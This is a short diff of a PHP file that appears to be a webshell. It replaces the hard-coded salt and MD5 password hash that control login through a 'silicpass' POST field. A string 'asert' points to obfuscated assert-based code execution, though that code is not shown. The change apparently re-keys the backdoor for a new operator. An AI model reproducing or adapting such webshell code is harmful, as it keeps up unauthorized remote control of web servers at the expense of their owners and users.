@@ -14,9 +14,9 @@ function Root_GP(&$array)
 	}
 	return $array;
 }
-$salt = "silic1234";
+$salt = "okbang";
 $psw = trim($_POST['silicpass']);
-$password="d16fb36f0911f878998c136191af705e";
+$password="e697733d0130fdd549922fd6f275cc0e";
 $passt = $salt.$psw;
 $passt = md5(md5(md5($passt)));
 $asse='asert';
